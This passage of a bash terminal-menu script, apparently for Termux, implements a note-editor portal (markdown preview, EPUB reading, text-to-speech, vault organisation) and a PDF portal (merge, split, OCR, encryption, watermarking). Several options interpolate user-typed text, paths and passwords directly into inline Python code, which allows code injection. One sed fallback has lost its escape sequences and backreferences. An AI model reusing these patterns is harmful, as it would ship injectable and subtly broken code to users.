                    _opicked="${_obs_files[$((_onum-1))]}"
                fi
                [[ -z "$_opicked" || ! -f "$_opicked" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                local _obsdir="${_obs_vaults[0]}/Fezzy Research"
                mkdir -p "$_obsdir" 2>/dev/null
                local _obsdest="$_obsdir/$(basename "${_opicked%.txt}").md"
                {
                    printf "# %s\n" "$(basename "${_opicked%.txt}" | tr '_' ' ')"
                    printf "**Source:** Fezzy Station Research Portal  \n"
                    printf "**Date:** %s  \n\n" "$(date '+%Y-%m-%d %H:%M')"
                    printf "---\n\n"
                    cat "$_opicked"
                } > "$_obsdest" 2>/dev/null
                printf "\n  ${GRN}✓ Saved to Obsidian:${RESET}\n"
                printf "  ${WH}%s${RESET}\n" "$_obsdest"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}
#  [13] NOTE EDITOR — Write · Markdown · EPUB · TTS · Categories
# ═══════════════════════════════════════════════════════════════════


# ═══════════════════════════════════════════════════════════════════
#  [13] NOTE EDITOR — Write · Markdown · EPUB · TTS · Categories
# ═══════════════════════════════════════════════════════════════════

documents_portal() {
    while true; do
        clear
        _portal_entry "Note Editor" "${C13}"
        echo ""
        _dv13
        printf "  ${C13}${BOLD}NOTE EDITOR  —  Write · Markdown · EPUB · Text-to-Speech${RESET}\n"
        _dv13
        echo ""
        printf "  ${WH}Vault: %s${RESET}\n" "$DOCDIR"
        printf "  ${FADE}■ Wrote more bars in the notepad than the studio ever heard · vault locked · words don't leave${RESET}\n"
        echo ""
        _dv13
        echo ""
        printf "  ${WH}[1]  Write Document — create .txt/.md/.sh file in vault            ${RESET}\n"
        printf "  ${WH}[2]  Markdown Preview — render .md files in terminal              ${RESET}\n"
        printf "  ${WH}[3]  EPUB Reader — read EPUB books in terminal                     ${RESET}\n"
        printf "  ${WH}[4]  Text-to-Speech — read any text file aloud (espeak)           ${RESET}\n"
        printf "  ${WH}[5]  Organize by Category — create folders for sorting            ${RESET}\n"
        printf "  ${WH}[6]  Move to Category — organise notes into folders               ${RESET}\n"
        printf "  ${WH}[7]  Batch Rename — rename multiple notes with pattern            ${RESET}\n"
        printf "  ${WH}[8]  Vault Stats — total count, size, categories                  ${RESET}\n"
        printf "  ${WH}[9]  Search Notes — grep keyword across all notes in vault        ${RESET}\n"
        printf "  ${WH}[10] Export to sdcard — copy note to /sdcard/Download             ${RESET}\n"
        printf "  ${WH}[11] Word Count — count words in any note                         ${RESET}\n"
        printf "  ${WH}[12] Note Viewer — list and read notes in vault                   ${RESET}\n"
        printf "  ${C13}[13] Color Preview — open any note with syntax highlighting         ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv13
        echo ""
        _hover_hint "docs"
        echo ""
        printf "  ${C13}${BOLD}Choice » ${RESET}"
        read -r ch

        case "$ch" in
            1)
                _write_document "$DOCDIR" "Note Editor"
                ;;
            2)
                echo ""
                printf "  ${C13}Markdown Preview — .md files:${RESET}\n\n"
                mapfile -t mdfiles < <(find "$DOCDIR" -maxdepth 2 -name "*.md" -type f 2>/dev/null | sort)
                if [[ ${#mdfiles[@]} -eq 0 ]]; then
                    printf "  ${FADE}No .md files found in vault${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                local i=1; for f in "${mdfiles[@]}"; do printf "  ${C13}%3d.${RESET} %s\n" "$i" "$(basename "$f")"; ((i++)); done
                echo ""; printf "  ${WH}Number to preview: ${RESET}"; read -r num
                local mdfile="${mdfiles[$(( num - 1 ))]}"
                [[ ! -f "$mdfile" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C13}[*] Rendering: %s${RESET}\n\n" "$(basename "$mdfile")"
                if command -v glow &>/dev/null; then
                    glow "$mdfile" | less -R
                else
                    sed 's/^# \(.*\)/\x1b[1;93m\1\x1b[0m/;
                         s/^## \(.*\)/\x1b[1;96m\1\x1b[0m/;
                         s/^### \(.*\)/\x1b[1;95m\1\x1b[0m/;
                         s/\*\*\([^*]*\)\*\*/\x1b[1m\1\x1b[0m/g;
                         s/`\([^`]*\)`/\x1b[38;5;51m\1\x1b[0m/g' "$mdfile" | less -R
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                printf "  ${C13}EPUB Reader:${RESET}\n\n"
                mapfile -t epubs < <(find "$DOCDIR" -name "*.epub" -type f 2>/dev/null | sort)
                if [[ ${#epubs[@]} -eq 0 ]]; then
                    printf "  ${FADE}No EPUB files found in vault${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                local i=1; for f in "${epubs[@]}"; do printf "  ${C13}%3d.${RESET} %s\n" "$i" "$(basename "$f")"; ((i++)); done
                echo ""; printf "  ${WH}Number to read: ${RESET}"; read -r num
                local epub="${epubs[$(( num - 1 ))]}"
                [[ ! -f "$epub" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C13}[*] Reading: %s${RESET}\n\n" "$(basename "$epub")"
                printf "  ${FADE}(q to quit, space to page, arrow keys to scroll)${RESET}\n\n"
                sleep 1
                if command -v epr &>/dev/null; then
                    epr "$epub"
                elif command -v python3 &>/dev/null; then
                    local tmp_dir=$(mktemp -d)
                    unzip -q "$epub" -d "$tmp_dir" 2>/dev/null
                    find "$tmp_dir" -name "*.html" -o -name "*.xhtml" 2>/dev/null | sort | while IFS= read -r hf; do
                        sed 's/<[^>]*>//g' "$hf" 2>/dev/null | grep -v "^[[:space:]]*$"
                    done | less -R
                    rm -rf "$tmp_dir"
                else
                    printf "  ${RED}No EPUB reader found — pip install epr-reader${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""
                printf "  ${C13}Text-to-Speech — read a text file:${RESET}\n\n"
                mapfile -t txtfiles < <(find "$DOCDIR" -maxdepth 2 -name "*.txt" -type f 2>/dev/null | sort)
                if [[ ${#txtfiles[@]} -eq 0 ]]; then
                    printf "  ${FADE}No .txt files found in vault${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                local i=1; for f in "${txtfiles[@]}"; do printf "  ${C13}%3d.${RESET} %s\n" "$i" "$(basename "$f")"; ((i++)); done
                echo ""; printf "  ${WH}Number to read aloud: ${RESET}"; read -r num
                local txt="${txtfiles[$(( num - 1 ))]}"
                [[ ! -f "$txt" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C13}[*] Speaking: %s${RESET}\n\n" "$(basename "$txt")"
                if command -v espeak &>/dev/null; then
                    printf "  ${GRN}[→] Speaking with espeak (Ctrl+C to stop)${RESET}\n\n"
                    espeak -f "$txt" -s 160 2>/dev/null
                elif command -v espeak-ng &>/dev/null; then
                    espeak-ng -f "$txt" -s 160 2>/dev/null
                else
                    printf "  ${RED}espeak not installed — pkg install espeak${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""; printf "  ${WH}Category name to create: ${RESET}"; read -r category
                [[ -z "$category" ]] && continue
                mkdir -p "$DOCDIR/$category"
                printf "  ${GRN}✓ Category created: %s/%s${RESET}\n" "$DOCDIR" "$category"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                printf "  ${C13}[*] Notes in vault:${RESET}\n\n"
                mapfile -t vaultlist < <(find "$DOCDIR" -maxdepth 1 -type f \( -name "*.txt" -o -name "*.md" -o -name "*.sh" \) 2>/dev/null | sort)
                [[ ${#vaultlist[@]} -eq 0 ]] && { printf "  ${FADE}Vault empty${RESET}\n"; sleep 1; continue; }
                local i=1; for f in "${vaultlist[@]}"; do printf "  ${C13}%3d.${RESET} %s\n" "$i" "$(basename "$f")"; ((i++)); done
                echo ""; printf "  ${WH}Number to move: ${RESET}"; read -r num
                local note="${vaultlist[$(( num - 1 ))]}"
                [[ ! -f "$note" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C13}[*] Categories:${RESET}\n\n"
                find "$DOCDIR" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | sed 's|.*/||' | nl -w2 -s". " || printf "  ${FADE}None — create one with [5]${RESET}\n"
                echo ""; printf "  ${WH}Category name: ${RESET}"; read -r category
                [[ ! -d "$DOCDIR/$category" ]] && { printf "  ${RED}Category not found${RESET}\n"; sleep 1; continue; }
                mv "$note" "$DOCDIR/$category/" && printf "  ${GRN}✓ Moved to %s${RESET}\n" "$category" || printf "  ${RED}Move failed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""; printf "  ${WH}Prefix to add to all top‑level notes: ${RESET}"; read -r prefix
                [[ -z "$prefix" ]] && continue
                echo ""
                printf "  ${C13}[*] Renaming with prefix '%s'...${RESET}\n\n" "$prefix"
                for note in "$DOCDIR"/*.{txt,md,sh}; do
                    [[ ! -f "$note" ]] && continue
                    local newname="$DOCDIR/${prefix}_$(basename "$note")"
                    mv "$note" "$newname" && printf "  ${GRN}✓${RESET} %s\n" "$(basename "$newname")"
                done 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""
                printf "  ${C13}[*] Vault Statistics:${RESET}\n\n"
                local count=$(find "$DOCDIR" -type f \( -name "*.txt" -o -name "*.md" -o -name "*.sh" -o -name "*.epub" \) 2>/dev/null | wc -l)
                local size=$(du -sh "$DOCDIR" 2>/dev/null | awk '{print $1}')
                local categories=$(find "$DOCDIR" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | wc -l)
                printf "  ${WH}Total notes :${RESET} %s\n" "$count"
                printf "  ${WH}Total Size :${RESET} %s\n" "$size"
                printf "  ${WH}Categories :${RESET} %s\n" "$categories"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""; printf "  ${WH}Keyword to search: ${RESET}"; read -r kw
                [[ -z "$kw" ]] && continue
                echo ""
                printf "  ${C13}[*] Searching vault for '%s'...${RESET}\n\n" "$kw"
                grep -rin "$kw" "$DOCDIR" --include="*.txt" --include="*.md" --include="*.sh" 2>/dev/null \
                    | sed "s|$DOCDIR/||" \
                    | awk -F: '{printf "  \033[38;5;211m%s\033[0m:\033[38;5;238m%s\033[0m  %s\n", $1, $2, $3}' \
                    || printf "  ${FADE}No matches found${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""
                mapfile -t expfiles < <(find "$DOCDIR" -maxdepth 2 -type f \( -name "*.txt" -o -name "*.md" -o -name "*.sh" \) 2>/dev/null | sort)
                if [[ ${#expfiles[@]} -eq 0 ]]; then printf "  ${FADE}Vault empty${RESET}\n"; sleep 1; continue; fi
                local i=1; for f in "${expfiles[@]}"; do printf "  ${C13}%3d.${RESET} %s\n" "$i" "$(basename "$f")"; ((i++)); done
                echo ""; printf "  ${WH}Number to export to /sdcard/Download: ${RESET}"; read -r num
                local exf="${expfiles[$(( num - 1 ))]}"
                [[ ! -f "$exf" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                cp "$exf" /sdcard/Download/ \
                    && printf "  ${GRN}✓ Exported: /sdcard/Download/%s${RESET}\n" "$(basename "$exf")" \
                    || printf "  ${RED}Export failed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""
                mapfile -t wcfiles < <(find "$DOCDIR" -maxdepth 2 -type f \( -name "*.txt" -o -name "*.md" \) 2>/dev/null | sort)
                if [[ ${#wcfiles[@]} -eq 0 ]]; then printf "  ${FADE}No text files in vault${RESET}\n"; sleep 1; continue; fi
                local i=1; for f in "${wcfiles[@]}"; do printf "  ${C13}%3d.${RESET} %s\n" "$i" "$(basename "$f")"; ((i++)); done
                echo ""; printf "  ${WH}Number to count words: ${RESET}"; read -r num
                local wcf="${wcfiles[$(( num - 1 ))]}"
                [[ ! -f "$wcf" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                echo ""
                local wcount; wcount=$(wc -w < "$wcf")
                local lcount; lcount=$(wc -l < "$wcf")
                local ccount; ccount=$(wc -c < "$wcf")
                printf "  ${C13}File :${RESET} %s\n" "$(basename "$wcf")"
                printf "  ${WH}Words :${RESET} %s\n" "$wcount"
                printf "  ${WH}Lines :${RESET} %s\n" "$lcount"
                printf "  ${WH}Chars :${RESET} %s\n" "$ccount"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12)
                echo ""
                mapfile -t nvfiles < <(find "$DOCDIR" -maxdepth 2 -type f \( -name "*.txt" -o -name "*.md" -o -name "*.sh" \) 2>/dev/null | sort)
                if [[ ${#nvfiles[@]} -eq 0 ]]; then printf "  ${FADE}Vault empty${RESET}\n"; sleep 1; continue; fi
                printf "  ${C13}${BOLD}NOTE VAULT — %s files${RESET}\n\n" "${#nvfiles[@]}"
                local nvi=1; for nvf2 in "${nvfiles[@]}"; do
                    local nvsz; nvsz=$(du -h "$nvf2" 2>/dev/null | awk '{print $1}')
                    printf "  ${C13}%3d.${RESET} %-40s ${FADE}%s${RESET}\n" "$nvi" "$(basename "$nvf2")" "$nvsz"
                    ((nvi++))
                done
                echo ""; printf "  ${WH}Number to read: ${RESET}"; read -r num
                local nvpick="${nvfiles[$(( num - 1 ))]}"
                [[ ! -f "$nvpick" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C13}[*] Reading: %s${RESET}\n\n" "$(basename "$nvpick")"
                less -R "$nvpick" 2>/dev/null || cat "$nvpick"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            13)
                clear; echo ""
                _dv13
                printf "  ${C13}${BOLD}COLOR PREVIEW — Note Vault${RESET}\n"
                _dv13; echo ""
                local -a _cpnotes=()
                mapfile -t _cpnotes < <(find "$DOCDIR" -maxdepth 3 -type f \( -name "*.txt" -o -name "*.md" -o -name "*.sh" -o -name "*.py" \) 2>/dev/null | sort)
                if [[ ${#_cpnotes[@]} -eq 0 ]]; then
                    printf "  ${FADE}No notes found in vault${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                for _cpi in "${!_cpnotes[@]}"; do
                    local _cpsz; _cpsz=$(du -sh "${_cpnotes[$_cpi]}" 2>/dev/null | cut -f1)
                    printf "  ${C13}%3d.${RESET}  ${WH}%-38s${RESET}  ${FADE}%s${RESET}\n"                         "$((_cpi+1))" "$(basename "${_cpnotes[$_cpi]}")" "$_cpsz"
                done
                echo ""; printf "  ${WH}Pick number: ${RESET}"; read -r _cpn
                [[ ! "$_cpn" =~ ^[0-9]+$ ]] && continue
                local _cpfile="${_cpnotes[$((_cpn-1))]}"
                [[ ! -f "$_cpfile" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C13}[*] Previewing: %s${RESET}\n\n" "$(basename "$_cpfile")"
                if command -v bat &>/dev/null; then
                    bat --color=always --style=numbers "$_cpfile" 2>/dev/null | less -R
                else
                    sed 's/^# \(.*\)/[1;93m[0m/;
                         s/^## \(.*\)/[1;96m[0m/;
                         s/^### \(.*\)/[1;95m[0m/;
                         s/`\([^`]*\)`/[38;5;51m[0m/g;
                         s/^\(#.*\)/[38;5;214m[0m/;
                         s/^\(alias .*\)/[38;5;82m[0m/' "$_cpfile" | less -R
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done
}

pdf_portal() {
    while true; do
        clear
        _portal_entry "PDF Portal" "${C12}"
        echo ""
        _dv12
        printf "  ${C12}${BOLD}PDF PORTAL  —  Read · Write · Extract · Merge · Split  ${RESET}\n"
        _dv12
        echo ""
        printf "  ${WH}[1]  Read PDF — view text content in terminal                     ${RESET}\n"
        printf "  ${WH}[2]  Write Document — create .txt/.md file in PDF vault          ${RESET}\n"
        printf "  ${WH}[3]  View PDF Info — metadata and page count                     ${RESET}\n"
        printf "  ${WH}[4]  Extract Text — convert PDF to plain text file               ${RESET}\n"
        printf "  ${WH}[5]  Merge PDFs — combine multiple PDFs into one                 ${RESET}\n"
        printf "  ${WH}[6]  Split PDF — separate pages into individual files            ${RESET}\n"
        printf "  ${WH}[7]  Convert to Images — PDF pages to PNG/JPG                    ${RESET}\n"
        printf "  ${WH}[8]  OCR Scan — make scanned PDFs searchable                     ${RESET}\n"
        printf "  ${WH}[9]  Compress PDF — reduce file size with Ghostscript            ${RESET}\n"
        printf "  ${WH}[10] Extract Images — pull all images from PDF                   ${RESET}\n"
        printf "  ${WH}[11] Rotate Pages — rotate all pages 90/180/270 degrees          ${RESET}\n"
        printf "  ${WH}[12] PDF Annotator — add text overlay comments to a PDF          ${RESET}\n"
        printf "  ${WH}[13] Install Tools — pdftools, poppler, ocrmypdf, ghostscript    ${RESET}\n"
        echo ""
        printf "  ${C12}${BOLD}── ADVANCED PDF TOOLS ─────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[14] Password Protect — encrypt PDF with password                ${RESET}\n"
        printf "  ${WH}[15] Remove Password — decrypt protected PDF                     ${RESET}\n"
        printf "  ${WH}[16] Add Watermark — text watermark on all pages                 ${RESET}\n"
        printf "  ${WH}[17] PDF Repair — fix corrupted/damaged PDF files                ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv12
        echo ""
        _hover_hint "pdf"
        echo ""
        printf "  ${C12}${BOLD}Choice » ${RESET}"
        read -r ch

        case "$ch" in
            1)
                local pdf; pdf=$(_pdf_picker) || continue
                echo ""
                printf "  ${C12}[*] Reading: %s${RESET}\n\n" "$(basename "$pdf")"
                printf "  ${FADE}(q to quit, arrow keys to scroll)${RESET}\n\n"
                pdftotext "$pdf" - 2>/dev/null | less -R
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                ;;
            2)
                _write_document "$PDFDIR" "PDF Vault"
                ;;
            3)
                local pdf; pdf=$(_pdf_picker) || continue
                echo ""
                printf "  ${C12}[*] PDF Info:${RESET}\n\n"
                pdfinfo "$pdf" 2>/dev/null || printf "  ${RED}pdfinfo not installed — run option [13]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                ;;
            4)
                local pdf; pdf=$(_pdf_picker) || continue
                local output="$PDFDIR/$(basename "${pdf%.pdf}_extracted.txt")"
                echo ""
                printf "  ${C12}[*] Extracting text from %s...${RESET}\n\n" "$(basename "$pdf")"
                pdftotext "$pdf" "$output" 2>/dev/null && printf "  ${GRN}✓ Text saved to: %s${RESET}\n" "$output" || printf "  ${RED}pdftotext not installed — run option [13]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                ;;
            5)
                echo ""; printf "  ${WH}Enter PDF paths to merge (one per line, Ctrl+D when done):${RESET}\n"
                local pdfs=()
                while IFS= read -r p; do
                    [[ -z "$p" ]] && continue
                    pdfs+=("$p")
                done
                [[ ${#pdfs[@]} -lt 2 ]] && { printf "  ${RED}Need at least 2 PDFs to merge${RESET}\n"; sleep 1; continue; }
                local output="$PDFDIR/merged_$(date +%Y%m%d_%H%M%S).pdf"
                echo ""
                printf "  ${C12}[*] Merging %s PDFs...${RESET}\n\n" "${#pdfs[@]}"
                pdfunite "${pdfs[@]}" "$output" 2>/dev/null && printf "  ${GRN}✓ Merged PDF: %s${RESET}\n" "$output" || printf "  ${RED}pdfunite not installed — run option [13]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                ;;
            6)
                local pdf; pdf=$(_pdf_picker) || continue
                local outdir="$PDFDIR/$(basename "${pdf%.pdf}")_pages"
                mkdir -p "$outdir"
                echo ""
                printf "  ${C12}[*] Splitting %s into pages...${RESET}\n\n" "$(basename "$pdf")"
                pdfseparate "$pdf" "$outdir/page_%d.pdf" 2>/dev/null && printf "  ${GRN}✓ Pages saved to: %s${RESET}\n" "$outdir" || printf "  ${RED}pdfseparate not installed — run option [13]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                ;;
            7)
                local pdf; pdf=$(_pdf_picker) || continue
                printf "  ${WH}Format [png/jpg]: ${RESET}"; read -r fmt
                [[ "$fmt" != "png" && "$fmt" != "jpg" ]] && fmt="png"
                local outdir="$PDFDIR/$(basename "${pdf%.pdf}")_images"
                mkdir -p "$outdir"
                echo ""
                printf "  ${C12}[*] Converting %s to %s images...${RESET}\n\n" "$(basename "$pdf")" "$fmt"
                pdftoppm "$pdf" "$outdir/page" -"$fmt" 2>/dev/null && printf "  ${GRN}✓ Images saved to: %s${RESET}\n" "$outdir" || printf "  ${RED}pdftoppm not installed — run option [13]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                ;;
            8)
                local pdf; pdf=$(_pdf_picker) || continue
                local output="$PDFDIR/$(basename "${pdf%.pdf}_ocr.pdf")"
                echo ""
                printf "  ${C12}[*] Running OCR on %s (may take a while)...${RESET}\n\n" "$(basename "$pdf")"
                ocrmypdf "$pdf" "$output" 2>/dev/null && printf "  ${GRN}✓ OCR PDF saved: %s${RESET}\n" "$output" || printf "  ${RED}ocrmypdf not installed — run option [13]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                ;;
            9)
                local pdf; pdf=$(_pdf_picker) || continue
                local output="$PDFDIR/$(basename "${pdf%.pdf}_compressed.pdf")"
                echo ""
                printf "  ${C12}[*] Compressing %s with Ghostscript...${RESET}\n\n" "$(basename "$pdf")"
                gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/ebook -dNOPAUSE -dQUIET -dBATCH -sOutputFile="$output" "$pdf" 2>/dev/null && printf "  ${GRN}✓ Compressed PDF: %s${RESET}\n" "$output" || printf "  ${RED}gs (ghostscript) not installed — run option [13]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                ;;
            10)
                local pdf; pdf=$(_pdf_picker) || continue
                local outdir="$PDFDIR/$(basename "${pdf%.pdf}")_extracted_images"
                mkdir -p "$outdir"
                echo ""
                printf "  ${C12}[*] Extracting images from %s...${RESET}\n\n" "$(basename "$pdf")"
                pdfimages "$pdf" "$outdir/img" 2>/dev/null && printf "  ${GRN}✓ Images extracted to: %s${RESET}\n" "$outdir" || printf "  ${RED}pdfimages not installed — run option [13]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                ;;
            11)
                local pdf; pdf=$(_pdf_picker) || continue
                printf "  ${WH}Degrees [90/180/270]: ${RESET}"; read -r deg
                [[ "$deg" != "90" && "$deg" != "180" && "$deg" != "270" ]] && { printf "  ${RED}Invalid rotation${RESET}\n"; sleep 1; continue; }
                local output="$PDFDIR/$(basename "${pdf%.pdf}_rotated${deg}.pdf")"
                echo ""
                printf "  ${C12}[*] Rotating %s by %s degrees...${RESET}\n\n" "$(basename "$pdf")" "$deg"
                pdftk "$pdf" cat 1-end${deg} output "$output" 2>/dev/null && printf "  ${GRN}✓ Rotated PDF: %s${RESET}\n" "$output" || printf "  ${RED}pdftk not installed or error occurred${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                ;;
            12)
                local pdf; pdf=$(_pdf_picker) || continue
                echo ""
                printf "  ${C12}[*] PDF Annotator — add text overlay to PDF${RESET}\n\n"
                printf "  ${WH}Annotation text: ${RESET}"; read -r atext
                [[ -z "$atext" ]] && { printf "  ${RED}No text entered${RESET}\n"; sleep 1; continue; }
                printf "  ${WH}Page (1=first, 0=all): ${RESET}"; read -r apage
                printf "  ${WH}Position [tl/tc/tr/bl/bc/br, default bl]: ${RESET}"; read -r apos
                [[ -z "$apos" ]] && apos="bl"
                local output="$PDFDIR/annotated_$(basename "$pdf")"
                echo ""
                printf "  ${C12}[*] Checking Python libs...${RESET}\n"
                pip show reportlab PyPDF2 &>/dev/null || pip install reportlab PyPDF2 --break-system-packages -q
                python3 -c "
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import A4
from PyPDF2 import PdfReader, PdfWriter
import io
annotation = '''$atext'''
src = '''$pdf'''
dst = '''$output'''
apos = '''$apos'''
target = '''$apage'''
positions = {'tl':(30,810),'tc':(290,810),'tr':(550,810),'bl':(30,20),'bc':(290,20),'br':(550,20)}
x,y = positions.get(apos,(30,20))
reader = PdfReader(src); writer = PdfWriter()
pages_to_annotate = list(range(len(reader.pages))) if target=='0' else [int(target)-1]
for i,page in enumerate(reader.pages):
    if i in pages_to_annotate:
        pkt=io.BytesIO(); c=canvas.Canvas(pkt,pagesize=A4)
        c.setFont('Helvetica-Bold',10); c.setFillColorRGB(1,0.2,0.6)
        c.drawString(x,y,annotation); c.save(); pkt.seek(0)
        overlay=PdfReader(pkt).pages[0]; page.merge_page(overlay)
    writer.add_page(page)
with open(dst,'wb') as f: writer.write(f)
print('SAVED')
" && printf "  ${GRN}✓ Annotated PDF → %s${RESET}\n" "$output"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                ;;
            13)
                echo ""
                printf "  ${C12}[*] Installing PDF tools...${RESET}\n\n"
                pkg install poppler ghostscript -y
                pip install ocrmypdf --break-system-packages
                printf "  ${GRN}✓ PDF tools installed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                ;;
            14)
                local pdf; pdf=$(_pdf_picker) || continue
                echo ""; printf "  ${WH}Password to encrypt PDF: ${RESET}"; read -rs pwd
                echo ""
                [[ -z "$pwd" ]] && { printf "  ${RED}Password required${RESET}\n"; sleep 1; continue; }
                local output="$PDFDIR/$(basename "${pdf%.pdf}")_encrypted.pdf"
                echo ""
                printf "  ${C12}[*] Encrypting PDF...${RESET}\n\n"
                qpdf --encrypt "$pwd" "$pwd" 256 -- "$pdf" "$output" 2>/dev/null \
                    && printf "  ${GRN}✓ Encrypted: %s${RESET}\n" "$output" \
                    || { pip install pikepdf --break-system-packages -q 2>/dev/null
                         python3 -c "import pikepdf; pdf=pikepdf.open('$pdf'); pdf.save('$output',encryption=pikepdf.Encryption(user='$pwd',owner='$pwd'))" \
                         && printf "  ${GRN}✓ Encrypted: %s${RESET}\n" "$output" \
                         || printf "  ${RED}Encryption failed — install qpdf or pikepdf${RESET}\n"; }
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            15)
                local pdf; pdf=$(_pdf_picker) || continue
                echo ""; printf "  ${WH}PDF password: ${RESET}"; read -rs pwd
                echo ""
                [[ -z "$pwd" ]] && { printf "  ${RED}Password required${RESET}\n"; sleep 1; continue; }
                local output="$PDFDIR/$(basename "${pdf%.pdf}")_decrypted.pdf"
                echo ""
                printf "  ${C12}[*] Decrypting PDF...${RESET}\n\n"
                qpdf --password="$pwd" --decrypt "$pdf" "$output" 2>/dev/null \
                    && printf "  ${GRN}✓ Decrypted: %s${RESET}\n" "$output" \
                    || printf "  ${RED}Decryption failed — wrong password or install qpdf${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            16)
                local pdf; pdf=$(_pdf_picker) || continue
                echo ""; printf "  ${WH}Watermark text: ${RESET}"; read -r wtext
                [[ -z "$wtext" ]] && { printf "  ${RED}Text required${RESET}\n"; sleep 1; continue; }
                local output="$PDFDIR/$(basename "${pdf%.pdf}")_watermarked.pdf"
                echo ""
                printf "  ${C12}[*] Adding watermark...${RESET}\n\n"
                pip show reportlab PyPDF2 &>/dev/null || pip install reportlab PyPDF2 --break-system-packages -q
                python3 -c "
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import A4
from PyPDF2 import PdfReader, PdfWriter
import io
src='$pdf'; dst='$output'; text='$wtext'
reader=PdfReader(src); writer=PdfWriter()
for page in reader.pages:
    pkt=io.BytesIO(); c=canvas.Canvas(pkt,pagesize=A4)
    c.setFont('Helvetica-Bold',40); c.setFillColorRGB(0.9,0.9,0.9,alpha=0.3)
    c.saveState(); c.translate(300,400); c.rotate(45)
    c.drawCentredString(0,0,text); c.restoreState(); c.save()
    pkt.seek(0); overlay=PdfReader(pkt).pages[0]
    page.merge_page(overlay); writer.add_page(page)
with open(dst,'wb') as f: writer.write(f)
" && printf "  ${GRN}✓ Watermarked: %s${RESET}\n" "$output"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            17)
                local pdf; pdf=$(_pdf_picker) || continue
                local output="$PDFDIR/$(basename "${pdf%.pdf}")_repaired.pdf"
                echo ""
                printf "  ${C12}[*] Repairing PDF...${RESET}\n\n"
                if command -v qpdf &>/dev/null; then
                    qpdf --check "$pdf" 2>&1 | head -5
                    qpdf "$pdf" "$output" 2>/dev/null && printf "  ${GRN}✓ Repaired: %s${RESET}\n" "$output"
                else
                    gs -o "$output" -sDEVICE=pdfwrite -dPDFSETTINGS=/prepress "$pdf" 2>/dev/null \
                        && printf "  ${GRN}✓ Repaired: %s${RESET}\n" "$output" \
                        || printf "  ${RED}Repair failed — install qpdf or ghostscript${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
